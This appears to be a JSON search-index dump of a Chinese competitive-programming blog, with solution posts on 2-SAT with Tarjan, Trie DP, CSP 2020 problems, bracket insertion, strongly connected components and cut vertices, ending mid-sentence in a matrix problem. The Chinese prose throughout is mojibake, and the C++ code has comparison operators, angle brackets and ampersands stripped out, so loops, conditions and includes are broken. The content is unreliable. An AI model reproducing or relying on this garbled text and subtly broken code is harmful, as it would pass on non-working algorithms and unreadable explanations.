é¦–å…ˆæ˜¯å¯¹äºæ•°æ®çš„å¤„ç†ã€‚æ¯ä¸€ä¸ªè¯„å®¡å‘˜çš„è¾“å…¥éƒ½æ˜¯ä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œè€Œæ¯ä¸ªå­—ç¬¦ä¸²éƒ½æ˜¯ç”±å­—æ¯ $h/m$ å†åŠ ä¸Šææ–™ç¼–å·ç»„æˆçš„ã€‚å› æ­¤åªéœ€è¦å°†å…¶ç”¨ %s è¯»å…¥ååˆ†å¼€å¤„ç†å°±è¡Œäº†ã€‚ ç„¶åå°±æ˜¯å»ºå›¾çš„è¿‡ç¨‹ã€‚æˆ‘ä»¬å¯ä»¥æŠŠæ±‰ä¸æ»¡åˆ†åˆ«çœ‹æˆ $0$ å’Œ $1$ï¼Œç„¶åæ ¹æ®ä¸¤ä¸ªæ¡ä»¶åªè¦æ»¡è¶³å…¶ä¸€(ä¹Ÿå°±æ˜¯æˆ–)çš„åŸåˆ™è¿›è¡Œå»ºå›¾ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œè‹¥ $a,b$ ä¸¤ä¸ªæ•°çš„å€¼å‡ä¸º $1$ï¼Œä¹Ÿå°±æ˜¯è¯´ $a,b$ è‡³å°‘æœ‰ä¸€ä¸ªæ•°çš„å€¼ä¸º $1$ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç¡®å®šå»ºå‡ºçš„ä¸¤æ¡è¾¹æ˜¯ $a = 0$ æ¨å‡º $b = 1$ ä¸ $b = 0$ æ¨å‡º $a = 1$ã€‚ æœ€åå°±æ˜¯ä½¿ç”¨ $\\texttt{tarjan}$ ç®—æ³•æ±‚å‡ºå¼ºè¿é€šåˆ†é‡ï¼Œç„¶ååˆ¤æ–­åœ¨ä¸€ä¸ªå¼ºè¿é€šåˆ†é‡ä¸­æ˜¯å¦å­˜åœ¨ä¸€ç§ææ–™çš„å€¼æ—¢æœ‰ $0$ åˆæœ‰ $1$ã€‚è‹¥å‡ºç°è¿™ç§çŠ¶æ€ï¼Œå°±è¯´æ˜è¯¥ææ–™æ—¢éœ€è¦åšæˆæ±‰å¼ï¼Œä¹Ÿéœ€è¦åšæˆæ»¡å¼ï¼Œå› æ­¤æ¡ä»¶å­˜åœ¨çŸ›ç›¾ï¼Œæ‰€ä»¥è¿™ç§æƒ…å†µè¦è¾“å‡ºçš„æ˜¯ BADï¼›å¦åˆ™è¾“å‡º GOODã€‚ ä»£ç å¦‚ä¸‹ï¼š #include iostream#include cstdio#include stack#include cstring#define init(x) memset (x,0,sizeof (x))using namespace std;const int MAX = 1e3 + 5;stack int s;bool ok;int n,m,t,cnt,times,scc_cnt;int head[MAX 1],nxt[MAX 1],to[MAX 1],dfn[MAX 1],low[MAX 1],scc[MAX 1];void pre ();void build (int num1,bool ty1,int num2,bool ty2);void _add (int u,int v);void tarjan (int u);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); scanf (%d,t); while (t--) pre ();//åˆå§‹åŒ–å¾ˆé‡è¦ scanf (%d%d,n,m); //æ±‰ 0 æ»¡ 1 for (int i = 1;i = m;++i) char da[1000],db[1000]; int a = 0,b,c = 0,d; scanf (%s %s,da,db); if (da[0] == h) b = 0; else b = 1; if (db[0] == h) d = 0; else d = 1; for (int i = 1;i strlen (da);++i) a = a * 10 + da[i] - 0; for (int i = 1;i strlen (db);++i) c = c * 10 + db[i] - 0; build (a,b,c,d); for (int i = 1;i = 2 * n;++i) if (!dfn[i]) tarjan (i); for (int i = 1;i = n;++i)//æ˜¯å¦å­˜åœ¨çŸ›ç›¾ if (scc[i] == scc[i + n]) ok = 0; break; if (ok) puts (GOOD); else puts (BAD); return 0;void pre () cnt = times = scc_cnt = 0; ok = 1; init (head);init (nxt);init (to); init (dfn);init (low);init (scc);void build (int num1,bool ty1,int num2,bool ty2)//å»ºå›¾è¿‡ç¨‹ if (!ty1 !ty2)// the first one is false or the second one is false _add (num1,num2 + n);// we know the first one is true so we can infer the second one is false _add (num2,num1 + n); if (!ty1 ty2)// the first one is false or the second one is true _add (num1,num2);// we know the first one is true so we can infer the second one is true _add (num2 + n,num1 + n); if (ty1 !ty2)// the first one is true or the second one is false _add (num1 + n,num2 + n);// we know the first one is false so we can infer the second one is false _add (num2,num1); if (ty1 ty2)// the first one is true or the second one is true _add (num1 + n,num2);// we know the first one is false so we can infer the second one is true _add (num2 + n,num1); void _add (int u,int v)//è¿è¾¹ to[++cnt] = v; nxt[cnt] = head[u]; head[u] = cnt;void tarjan (int u)//å¼ºè¿é€šåˆ†é‡ dfn[u] = low[u] = ++times; s.push (u); for (int i = head[u];i;i = nxt[i]) int v = to[i]; if (!dfn[v]) tarjan (v); low[u] = min (low[u],low[v]); else if (!scc[v]) low[u] = min (low[u],dfn[v]); if (low[u] == dfn[u]) ++scc_cnt; while (1) int x = s.top (); s.pop (); scc[x] = scc_cnt; if (x == u) break;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šUVA1401 Remember the Word","path":"/2020/11/20/UVA1401/","content":"è¿™é“é¢˜æ‰€ç”¨çš„ç®—æ³•æ˜¯ $\\texttt{Trie + DP}$ã€‚ æˆ‘ä»¬è®¾ $dp[i]$ è¡¨ç¤ºé•¿å•è¯ $S$ çš„å‰ $i$ ä¸ªé•¿åº¦çš„æ–¹æ¡ˆæ•°ï¼Œåˆ™æœ‰(ä¿è¯ $S_{j\\cdots i}$ æ˜¯ä¸€ä¸ªå•è¯)ï¼š dp[i] = dp[i] + \\sum_{j = 1}^{i - 1}dp[j]å¦‚æœä½¿ç”¨æš´åŠ›è¿›è¡Œä¸¤å±‚å¾ªç¯ï¼Œä¸ç”¨è¯´è‚¯å®šè¶…æ—¶ã€‚ç”±é¢˜å¯çŸ¥åªæœ‰ $26$ ä¸ªå­—æ¯ï¼Œå› æ­¤å¯ä»¥æŠŠé•¿å•è¯ $S$ å»ºæˆä¸€æ£µå­—å…¸æ ‘ï¼Œç„¶åæšä¸¾èµ·ç‚¹ä½ç½®ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªå•è¯ç»“ç‚¹ï¼Œä¾¿å¯ä»¥è¿›è¡Œä¸€æ¬¡è½¬ç§»ã€‚ ä¼˜åŒ–ä¹‹åï¼Œå› ä¸ºé¢˜ç›®ä¸­è¯´æ¯ä¸ªå•è¯é•¿åº¦ä¸è¶…è¿‡ $100$ï¼Œå› æ­¤æœ€å¤šæœç´¢åˆ°æ·±åº¦ä¸º $100$ çš„ç»“ç‚¹ä¸Šï¼Œå› æ­¤ä¸ä¼šè¶…æ—¶äº†ã€‚ç»™ä¸ªä»£ç ï¼š #include iostream#include cstdio#include cstring#define mod 20071027using namespace std;char sen[300005];int n,num; int ch[400005][26],tot,cnt[400005],dp[400005];//å¼€å¤§ä¸€ç‚¹ï¼Œé˜²æ­¢ REstruct Trie void init ()//å¤šç»„æ•°æ®çš„åˆå§‹åŒ– tot = 0; memset (ch,-1,sizeof (ch)); memset (cnt,0,sizeof (cnt)); memset (dp,0,sizeof (dp)); void insert (char *str)//æ’å…¥ int len = strlen (str),p = 0; for (int i = 0;i len;++i) if (ch[p][str[i] - a] == -1) ch[p][str[i] - a] = ++tot; p = ch[p][str[i] - a]; ++cnt[p]; void find (int x)//æŸ¥æ‰¾ int len = strlen (sen),p = 0; for (int i = x;i len;++i) if (ch[p][sen[i] - a] == -1) return ; p = ch[p][sen[i] - a]; if (cnt[p]) if (x - 1 0) dp[i] += 1;//ç›¸å½“äºåˆå§‹åŒ– else dp[i] += dp[x - 1];//è½¬ç§» dp[i] %= mod;//å–æ¨¡ä¸èƒ½å¿˜è®° ;int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); while (scanf (%s,sen) != EOF)//å¤šç»„æ•°æ® ++num; Trie word; word.init (); scanf (%d,n); for (int i = 1;i = n;++i) char s[105];scanf (%s,s); word.insert (s); int len = strlen (sen); for (int i = 0;i len;++i) word.find (i);//ä»ç¬¬ i ä¸ªå¼€å§‹æŸ¥æ‰¾ printf (Case %d: %d ,num,dp[len - 1]);//æ³¨æ„æ ¼å¼ï¼Œæœ¬è’Ÿè’»å°±åœ¨è¿™é‡ŒæŒ‚äº†å‡ æ¬¡ return 0;","categories":["Solution"]},{"title":"CSP 2020 åœºå¤–ç¯‡","path":"/2020/11/07/CSP2020/","content":"å‰è¨€åæ ‡ $\\texttt{ZJ}$ï¼Œåˆä¸‰è’Ÿè’»ã€‚ åˆèµ› $\\texttt{TG}$ åªæœ‰ $\\texttt{64pts}$ï¼Œä¸å¹¸æ²¡è¿‡åˆèµ›ï¼ˆæˆåŠŸé€€å½¹ï¼Œå¼€å§‹ä¸ºä¸­è€ƒæ·¦ $\\texttt{whk}$ï¼‰ã€‚æ‰€ä»¥åªèƒ½ä½œä¸ºåœºå¤–é€‰æ‰‹ï¼Œè¿›è¡Œè‡ªæµ‹äº†ã€‚ æ™®åŠç¯‡$\\texttt{T1}$ä¸äºŒè¿›åˆ¶ç›¸å…³çš„ä¸€é“é¢˜ï¼Œä¸€ä¸ªæ•° $x$ èƒ½è¢«è¡¨ç¤ºæˆ $2$ çš„æ­£æ•´æ•°æ¬¡å¹‚ï¼Œå› æ­¤ä¸€ä¸ªæ•°åœ¨äºŒè¿›åˆ¶ä¸‹çš„æœ€åä¸€ä½ä¸€å®šæ˜¯ $0$ï¼Œå³ä¸ºå¶æ•°æ—¶æ‰èƒ½å¤Ÿè¢«æ‹†åˆ†ã€‚ å¯¹äºä¸€ä¸ªå¶æ•°ï¼Œä»é«˜ä½å¼€å§‹æšä¸¾ $k$ï¼Œä½¿å¾—æœ€å°çš„ $k$ æ»¡è¶³ $2^k \\ge n$ï¼Œç„¶å $n = n - 2^k$ å¹¶è®°å½• $2^k$ï¼Œé‡å¤æ“ä½œç›´åˆ° $k = 0$ã€‚æœ€åè¾“å‡ºå³å¯ã€‚ #include iostream#include cstdio#include cmathusing namespace std;int a[30],n,k,p; int main () freopen (power.in,r,stdin); freopen (power.out,w,stdout); int n; scanf (%d,n); p = pow (2,25); while (p 1 n) while (p n p 1) p = 1; if (n = p p 1) a[++k] = p,n -= p; if (n) printf (-1 ); else for (int i = 1;i = k;++i) printf (%d ,a[i]); puts (); return 0; $\\texttt{T2}$ç®€å•æ¨¡æ‹Ÿï¼Œä»”ç»†è¯»é¢˜æ³¨æ„ä¸€äº›ç»†èŠ‚å°±è¡Œ (æ¯”å¦‚å¾ªç¯èŒƒå›´ï¼Œæ•°æ®ç±»å‹ç­‰)ã€‚ å› ä¸ºæœ€å¤§çš„ç‚¹ $n = 10^5$ï¼Œå¦‚æœæ¯æ¬¡è¾“å…¥åéƒ½è¿›è¡Œä¸€æ¬¡å¿«æ’ï¼Œæœ€åå¯èƒ½è¶…æ—¶ã€‚ è€ƒè™‘ç”¨ä¸€ä¸ªæ•°ç»„ num[i] è®°å½•ä¸å°äºåˆ†æ•° $i$ çš„äººæ•°ã€‚è¾“å…¥ä¸€ä¸ªäººçš„åˆ†æ•° $x$ åï¼Œå°†ä¼šå¯¹æ•°ç»„ num[0-x] åˆ†åˆ«äº§ç”Ÿ $1$ çš„è´¡çŒ®ï¼Œç„¶åè®¡ç®—å‡ºå½“å‰è·å¥–äººæ•°ã€‚ ç”±é¢˜çŸ¥æ¯ä¸ªé€‰æ‰‹çš„æˆç»©å‡ä¸ºä¸è¶…è¿‡ $600$ çš„éè´Ÿæ•´æ•°ï¼Œæ‰€ä»¥å°±å¯ä»¥ä»å¤§åˆ°å°æšä¸¾ num[i]ï¼Œç›´åˆ°æ‰¾åˆ°ç¬¬ä¸€ä¸ª num[i] æ»¡è¶³ä¸å°äºå½“å‰è·å¥–äººæ•°åï¼Œè¾“å‡ºå¹¶é€€å‡ºå¾ªç¯ã€‚ #include iostream#include cstdio#include cmathusing namespace std;int n,w,x,num[605];//num[i] means the number of people that the scores are equal or more than i int main () freopen (live.in,r,stdin); freopen (live.out,w,stdout); scanf (%d%d,n,w); for (int i = 1;i = n;++i) scanf (%d,x); for (int j = 0;j = x;++j) ++num[j]; int now = max ((double) 1,floor ((double) i * w / 100.0)); for (int j = 600;j = 0;--j) if (num[j] = now) printf (%d ,j); break; puts (); return 0; $\\texttt{T3}$è¿™æ˜¯ä¸€é“æ¨¡æ‹Ÿé¢˜ï¼Œéœ€è¦è¶³å¤Ÿçš„è€å¿ƒä¸ç»†å¿ƒã€‚ä¸è¿‡å…¨è¾“å‡º $0$ æˆ– $1$ ä¹Ÿå¯ä»¥è·å¾—ä¸€äº›åˆ†ã€‚(æ‰‹åŠ¨ç‹—å¤´) $\\texttt{30pts}$ æ¯ä¸€æ¬¡è¯¢é—®éƒ½æ‰«ä¸€éåç¼€è¡¨è¾¾å¼è¿›è¡Œè®¡ç®—ï¼Œæ—¶é—´å¤æ‚åº¦ä¸º $O(q\\times |s|)$ï¼Œæ²¡å•¥æŠ€æœ¯å«é‡ï¼Œæ‰€ä»¥å…¶å®ƒçš„æµ‹è¯•ç‚¹å…¨éƒ½ $\\texttt{TLE}$ äº†ã€‚ $\\texttt{T4}$ä¸€çœ‹å°±æ˜¯ä¸€é“ $\\texttt{DP}$ é¢˜ç›®ï¼Œä» $(1,1)$ èµ°åˆ° $(n,m)$ çš„æœ€å¤§ä»·å€¼ï¼Œå¯ä»¥å‘å³å‘ä¸‹å‘ä¸Šèµ°ã€‚ å…ˆæ¥çœ‹å‘å³å‘ä¸‹ï¼Œè¿™ä¸¤ä¸ªå¾ˆå¥½å¤„ç†ï¼ŒçŠ¶æ€è½¬ç§»æ–¹ç¨‹å¦‚ä¸‹ï¼š dp[i][j] = \\max (dp[i][j - 1],dp[i - 1][j]) + a[i][j]ä½†æ˜¯å¯¹äºå‘ä¸Šï¼Œå¦‚æœåœ¨æŒ‰ä¹‹å‰çš„é¡ºåºè½¬ç§»ï¼Œé‚£ä¹ˆ $dp[i + 1][j]$ çš„å€¼å°±æ— æ³•åœ¨å¾—åˆ° $dp[i][j]$ ä¹‹å‰å¾—åˆ°äº†ã€‚æ”¹å˜ä¸€ä¸‹ç­–ç•¥å…ˆæœç´¢åˆ—å†æœç´¢è¡Œï¼Œè¿™æ ·å°±èƒ½å®Œç¾è§£å†³è¿™ä¸ªé—®é¢˜ã€‚ç„¶åæŠŠäºŒä½æ”¹æˆä¸‰ä½ï¼Œä¸€ä¸ªä»ä¸Šå¼€å§‹ï¼Œå¦ä¸€ä¸ªä»ä¸‹å¼€å§‹ã€‚ éœ€è¦æ³¨æ„çš„å‡ ç‚¹æœ‰ï¼š åˆå§‹åŒ–çš„é—®é¢˜ï¼Œæ³¨æ„æœ‰è´Ÿæ•°å­˜åœ¨ã€‚æœ€è¾¹ä¸Šçš„è¡Œä¸åˆ—å¯èƒ½éœ€è¦ç‰¹åˆ¤å»è¿›è¡Œæ±‚è§£ è¾¹ç•Œéœ€è¦ç€é‡è€ƒè™‘ã€‚ å…¨éƒ¨åŠ åœ¨ä¸€èµ·æœ‰å¯èƒ½ä¼šçˆ† intï¼Œå› æ­¤è¦å¼€ long longã€‚ æœç´¢çš„é¡ºåºä¸æ±‚è§£çš„é¡ºåºæ˜¯ç›¸å…³çš„ï¼Œä¸€å®šè¦æ³¨æ„æœ‰æ— åæ•ˆæ€§ã€‚ #include iostream#include cstdio#include cstring#define ll long longusing namespace std;const int MAX = 1005;int a[MAX][MAX],n,m;ll dp[MAX][MAX][2];int main () freopen (number.in,r,stdin); freopen (number.out,w,stdout); //dp[i][j][0] means from (1,1) to (n,m); //dp[i][j][1] means from (n,m) to (1,1). memset (dp,0x80,sizeof (dp)); scanf (%d%d,n,m); for (int i = 1;i = n;++i) for (int j = 1;j = m;++j) scanf (%d,a[i][j]); dp[1][1][1] = dp[1][1][0] = a[1][1]; dp[n][m][1] = dp[n][m][0] = a[n][m]; for (int i = 2;i = n;++i) dp[i][1][0] = dp[i - 1][1][0] + a[i][1]; for (int i = n - 1;i = 1;--i) dp[i][m][1] = dp[i + 1][m][1] + a[i][m]; for (int i = 2;i = m;++i) for (int j = 1;j = n;++j)//left dp[j][i][0] = dp[j][i][1] = max (dp[j][i - 1][0],dp[j][i - 1][1]) + a[j][i]; for (int j = 2;j = n;++j)//down dp[j][i][0] = max (dp[j][i][0],dp[j - 1][i][0] + a[j][i]); for (int j = n - 1;j = 1;--j)//up dp[j][i][1] = max (dp[j][i][1],dp[j + 1][i][1] + a[j][i]); printf (%lld ,max (dp[n][m][0],dp[n][m][1])); return 0;","categories":["Journal"]},{"title":"é¢˜è§£ï¼š[ABC064D] Insertion","path":"/2020/11/01/ABC064D/","content":"è¯»å…¥æ•´ä¸ªå­—ç¬¦ä¸²åç»Ÿè®¡ ( ä¸ ) çš„ä¸ªæ•°æ˜¯å¤šå°‘ã€‚ ç°åœ¨è®¾å·¦å³æ‹¬å·éœ€è¦å†æ·»åŠ çš„ä¸ªæ•°ä¸º $l,r$ã€‚ è‹¥è¯»å…¥ä¸€ä¸ª ( åˆ™è¯´æ˜éœ€è¦åŠ ä¸Šä¸€ä¸ª ) æ‰èƒ½å®Œæ•´é…å¯¹ï¼Œå³ ++rã€‚ è‹¥è¯»å…¥ä¸€ä¸ª ) åˆ™è¯´æ˜éœ€è¦åŠ ä¸Šä¸€ä¸ª ) æ‰èƒ½å®Œæ•´é…å¯¹ï¼Œæ­¤æ—¶æœ‰ä¸¤ç§æƒ…å†µï¼š$l = 0$ åˆ™è¯´æ˜éœ€è¦å¢åŠ  ( ä¸ªæ•°ï¼Œå³ ++lï¼›$l 0$ åˆ™è¯´æ˜ä¸€ç»„æ‹¬å·å·²é…å¯¹ï¼Œ--l å³å¯ã€‚ æœ€åå…ˆè¾“å‡ºå¢åŠ çš„ $l$ ä¸ª (ï¼Œç„¶åè¾“å‡ºåŸå­—ç¬¦ä¸²ï¼Œæœ€åè¾“å‡ºå¢åŠ çš„ $r$ ä¸ª )ã€‚ ä»£ç ï¼š #include iostream#include cstdiousing namespace std;int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); int n,l = 0,r = 0; string str; cinnstr; for (int i = 0;i n;++i) if (str[i] == () ++r;//å¢åŠ å³æ‹¬å·æ•°é‡ if (str[i] == ))//éœ€è¦å·¦æ‹¬å· if (r 0) --r;//æˆåŠŸé…å¯¹ï¼Œå¢åŠ çš„å³æ‹¬å·æ•°é‡å‡å°‘ else ++l;//å¢åŠ å·¦æ‹¬å·æ•°é‡ for (int i = 1;i = l;++i) cout(; coutstr; for (int i = 1;i = r;++i) cout); coutendl; return 0;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šUVA12167 Proving Equivalences","path":"/2020/10/19/UVA12167/","content":"å°†é—®é¢˜å¯ä»¥è¿›è¡Œè½¬åŒ–ï¼šæ±‚ä¸€å¼  $n$ ä¸ªç‚¹ $m$ æ¡è¾¹çš„æœ‰å‘å›¾ä¸Šè¿˜éœ€è¦å¢åŠ å‡ æ¡è¾¹æ‰å¯ä»¥ä½¿å›¾å¼ºè¿é€šã€‚ ç”±äºæ˜¯ä¸€å¼ æœ‰å‘å›¾ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ±‚å‡ºå¼ºè¿é€šåˆ†é‡ï¼Œç„¶åè¿›è¡Œç¼©ç‚¹å¹¶è®°å½•å‡ºåº¦æˆ–å…¥åº¦ä¸º $0$ çš„ç‚¹çš„ä¸ªæ•°ï¼Œæœ€åä¸¤è€…å– $\\max$ è¾“å‡ºç­”æ¡ˆã€‚ ä½†éœ€è¦æ³¨æ„çš„ç‚¹æœ‰ä¸¤ä¸ªï¼š è‹¥åŸå›¾åªæœ‰ $1$ ä¸ªå¼ºè¿é€šåˆ†é‡ï¼Œåˆ™éœ€è¦ç‰¹åˆ¤è¾“å‡º $0$ã€‚ åŸå›¾ä¸ä¿è¯è¿é€šï¼Œå› æ­¤è¿›è¡Œ dfs çš„æ—¶å€™éœ€è¦å¾ªç¯æ‰«ä¸€éã€‚ ç»™ä¸ªä»£ç ï¼š #include iostream#include cstdio#include stack#include cstring#define init(x) memset (x,0,sizeof (x))using namespace std;const int MAXN = 1e5 + 5;int t,n,m,cnt,times,scc_cnt,num1,num2;int dfn[MAXN],low[MAXN],vis[MAXN],in[MAXN],out[MAXN];int head[MAXN 1],to[MAXN 1],nxt[MAXN 1];stack int s;void _add (int u,int v);void tarjan (int u);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); scanf (%d,t); while (t--) cnt = times = scc_cnt = num1 = num2 = 0; init (dfn);init (low);init (vis);init (in);init (out); init (head);init (to);init (nxt); scanf (%d%d,n,m); for (int i = 1;i = m;++i) int x,y;scanf (%d%d,x,y); _add (x,y); for (int i = 1;i = n;++i) if (!dfn[i]) tarjan (i); for (int i = 1;i = n;++i)//ç¼©ç‚¹ for (int j = head[i];j;j = nxt[j]) int v = to[j]; if (vis[i] != vis[v])//ä¸åœ¨åŒä¸€ä¸ªå¼ºè¿é€šåˆ†é‡ä¸­ ++out[vis[i]],++in[vis[v]]; if (scc_cnt == 1) printf (0 ); continue; for (int i = 1;i = scc_cnt;++i) if (!in[i]) ++num1; if (!out[i]) ++num2; printf (%d ,max (num1,num2)); return 0;void _add (int u,int v) to[++cnt] = v; nxt[cnt] = head[u]; head[u] = cnt;void tarjan (int u) low[u] = dfn[u] = ++times; s.push (u); for (int i = head[u];i;i = nxt[i]) int v = to[i]; if (!dfn[v]) tarjan (v); low[u] = min (low[u],low[v]); else if (!vis[v]) low[u] = min (low[u],dfn[v]);//å¯¹äºå·²ç»æ±‚å‡º scc çš„ç‚¹ï¼Œç›´æ¥å¿½ç•¥ if (low[u] == dfn[u])//u æ˜¯å¼ºè¿é€šåˆ†é‡ä¸­ç¬¬ä¸€ä¸ªè¢«å‘ç°çš„ç‚¹ ++scc_cnt; while (1) int x = s.top ();s.pop (); vis[x] = scc_cnt; if (x == u) break;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šSP16185/UVA1108 BUSINESS - Mining your own business","path":"/2020/10/01/SPOJ16185/","content":"å°†é¢˜ç›®è¿›è¡Œè½¬åŒ–ï¼šåœ¨å›¾ä¸­å®‰è£…è‹¥å¹²ä¸ªå¤ªå¹³äº•åï¼Œä½¿å¾—ä»»æ„åˆ é™¤ä¸€ä¸ªç‚¹ï¼Œæ¯ä¸ªç‚¹åŒè¿é€šåˆ†é‡ä¸­éƒ½ä¹‹åæœ‰ä¸€ä¸ªå¤ªå¹³äº•ã€‚ ç”±é¢˜æ„å¯çŸ¥ï¼Œå®‰è£…å¤ªå¹³äº•ï¼Œè‚¯å®šä¸å‰²ç‚¹æœ‰å…³ã€‚å› æ­¤ï¼Œæˆ‘ä»¬å…ˆæ±‚å‡ºæ— å‘å›¾ä¸­çš„å‰²ç‚¹ã€‚ void dfs (int u,int fa) low[u] = dfn[u] = ++times;//æ—¶é—´æˆ³ int child = 0; for (int i = head[u];i;i = nxt[i]) int v = to[i]; if (!dfn[v]) ++child; dfs (v,u); low[u] = min (low[u],low[v]); if (dfn[u] = low[v])//ä¸ºå‰²ç‚¹ iscut[u] = 1; else if (v != fa dfn[v] dfn[u])//åå‘è¾¹ low[u] = min (low[u],dfn[v]); if (fa 0 child == 1) iscut[u] = 0;//ç‰¹æ®Šæƒ…å†µ æŠŠæ‰€æœ‰è¾¹åŒå‘å­˜å…¥åï¼Œè°ƒç”¨ dfs (1,-1)ï¼Œç„¶åæ ¹æ® iscut[i] çš„å¸ƒå°”å€¼åˆ¤æ–­è¯¥ç‚¹æ˜¯å¦ä¸ºå‰²ç‚¹ã€‚ ç‚¹åŒè¿é€šåˆ†é‡ä¸å‰²ç‚¹æ•°é‡çš„å…³ç³»å†³å®šäº†å®‰è£…å¤ªå¹³äº•çš„æ•°é‡ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨æ±‚å‰²ç‚¹çš„åŒæ—¶ä¹Ÿè¦è®°å½•æ¯ä¸€ä¸ªç‚¹åŒè¿é€šåˆ†é‡ã€‚ è¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ set int å˜é‡åï¼Œåœ¨è®°å½•æ¯ä¸€ä¸ªå…ƒç´ çš„åŒæ—¶ä¹Ÿå¯ä»¥å°†ç›¸åŒçš„å…ƒç´ å»é™¤ã€‚åœ¨ dfs (u,fa) å‡½æ•°çš„åŸºç¡€ä¸Šä¿®æ”¹ä¸€ä¸‹å³å¯ï¼Œç»“åˆæ³¨é‡Šï¼Œä»£ç åº”è¯¥å¾ˆå¥½ç†è§£ã€‚ void dfs (int u,int fa) low[u] = dfn[u] = ++times;//æ—¶é—´æˆ³ int child = 0; for (int i = head[u];i;i = nxt[i]) int v = to[i]; if (!dfn[v]) ++child; st.push (i);//åŠ å…¥å…ƒç´  dfs (v,u); low[u] = min (low[u],low[v]); if (dfn[u] = low[v])//ä¸ºå‰²ç‚¹ iscut[u] = 1; ++bcc_cnt;//ç‚¹åŒè¿é€šåˆ†é‡çš„æ•°é‡ while (1) int x = st.top ();st.pop (); con[bcc_cnt].insert (dis[x]);//ä¸¤æ¡ç›¸é‚»çš„è¾¹åŠ å…¥å…¶ä¸­ con[bcc_cnt].insert (to[x]); if (dis[x] == u to[x] == v) break;//é€€å‡ºå¾ªç¯çš„æ¡ä»¶ else if (v != fa dfn[v] dfn[u])//åå‘è¾¹ st.push (i);//åŠ å…¥å…ƒç´  low[u] = min (low[u],dfn[v]); if (fa 0 child == 1) iscut[u] = 0;//ç‰¹æ®Šæƒ…å†µ æœ€åå°±æ˜¯ç­”æ¡ˆçš„æ±‚è§£äº†ï¼Œå¯¹äºä¸€ä¸ªç‚¹åŒè¿é€šåˆ†é‡æœ‰ä»¥ä¸‹çš„æƒ…å†µï¼š å…¨éƒ¨è¿é€šï¼Œå‰²ç‚¹æ•°ä¸º $0$ã€‚æ­¤æ—¶è‹¥è¿æ¥ç‚¹åå¡Œï¼Œéœ€è¦ $2$ ä¸ªå¤ªå¹³äº•æ‰èƒ½ç¬¦åˆè¦æ±‚ã€‚è®¾è¿é€šå—å¤§å°ä¸º $sz$ï¼Œåˆ™ä»»æ„é€‰æ‹©ä¸¤ä¸ªç‚¹çš„æ–¹æ¡ˆæ•°ä¸º $C_{sz}^{2} = \\frac{sz \\times (sz - 1)}{2}$ã€‚ å‰²ç‚¹æ•°ä¸º $1$ã€‚æ­¤æ—¶è‹¥è¿æ¥ç‚¹åå¡Œï¼Œåªéœ€è¦ $1$ ä¸ªå¤ªå¹³äº•æ‰èƒ½ç¬¦åˆè¦æ±‚ã€‚è®¾è¿é€šå—å¤§å°ä¸º $sz$ï¼Œåˆ™ä»»æ„é€‰æ‹©ä¸€ä¸ªçš„æ–¹æ¡ˆæ•°ä¸º $sz - 1$ã€‚ å‰²ç‚¹æ•°å¤§äº $1$ã€‚æ­¤æ—¶æ˜“å¾—è‹¥ç¼ºå°‘ä¸€ä¸ªå‰²ç‚¹ï¼Œè¯¥ç‚¹åŒè¿é€šåˆ†é‡ä»ç„¶è”é€šï¼Œå› æ­¤ä¸éœ€è¦å®‰è£…ã€‚ éƒ¨åˆ†ä»£ç å¦‚ä¸‹ï¼Œæ³¨æ„éœ€è¦ä½¿ç”¨ä¹˜æ³•åŸç†ï¼Œä¸”éœ€è¦æ³¨æ„å˜é‡çš„ç±»å‹ã€‚ ull ans1 = 0,ans2 = 1;//æ³¨æ„ç±»å‹ for (int i = 1;i = bcc_cnt;++i) ull num = 0,sz = 0; for (set int :: iterator j = con[i].begin ();j != con[i].end ();++j) ++sz;//è¯¥è¿é€šå—çš„å¤§å° if (iscut[*j]) ++num;//å‰²ç‚¹æ•°é‡ if (num == 0) ans1 += 2,ans2 *= sz * (sz - 1) / 2;//ä¸º 0 çš„æƒ…å†µ else if (num == 1) ++ans1,ans2 *= (sz - 1);//ä¸º 1 çš„æƒ…å†µ å†™åœ¨æœ€åçš„è¯ï¼š ç”±äºä¸ºå¤šç»„æ•°æ®ï¼Œæ¯æ¬¡å¾—å‡ºç­”æ¡ˆåè®°å¾—åˆå§‹åŒ–ã€‚ è‹¥æœ‰é—®é¢˜ï¼ŒåŠæ—¶æå‡ºï¼Œè®°å¾—ç‚¹ä¸ªèµå†èµ°å“¦qwqï¼","categories":["Solution"]},{"title":"é¢˜è§£ï¼šP3208 [HNOI2010]çŸ©é˜µ","path":"/2020/09/13/P3208/","content":"è¿™é“é¢˜ä¸éš¾å‘ç°æ˜¯ä¸€é“æœç´¢é¢˜ + æ‰¾è§„å¾‹é¢˜ã€‚ é¦–å…ˆæ ¹æ®é¢˜æ„ï¼Œå¯ä»¥å‘ç°è‹¥çŸ©é˜µç¬¬ä¸€è¡Œä¸ç¬¬ä¸€åˆ—è¢«ç¡®å®šï¼Œé‚£ä¹ˆæ•´ä¸ªçŸ©é˜µä¸­çš„å…ƒç´ ä¹Ÿå°±èƒ½è¢«ä¸€ä¸€ç¡®å®šã€‚æ‰€ä»¥æ¯ä¸ªå…ƒç´ å¾ˆå¯èƒ½å¯ä»¥æ ¹æ®ç¬¬ä¸€è¡Œä¸ç¬¬ä¸€åˆ—ä¸Šçš„å…ƒç´ æ¨å¯¼å‡ºæ¥ã€‚éœ€è¦æ³¨æ„çš„ä¸€ç‚¹å°±æ˜¯ $a[1][1]$ è¿™ä¸ªå…ƒç´ ï¼Œå› ä¸ºå®ƒæ˜¯è¡Œä¸åˆ—çš„ç›¸äº¤å¤„ã€‚ ç»§ç»­è¿›è¡Œæ¨å¯¼ï¼Œè®¾ $s[i][j]$ è¡¨ç¤ºç»™å®šå’Œä¸­çš„æ¯ä¸€é¡¹ï¼Œ$a[i][j]$ è¡¨ç¤ºæ‰€æ±‚çš„ç­”æ¡ˆï¼Œ$f[i][j]$ 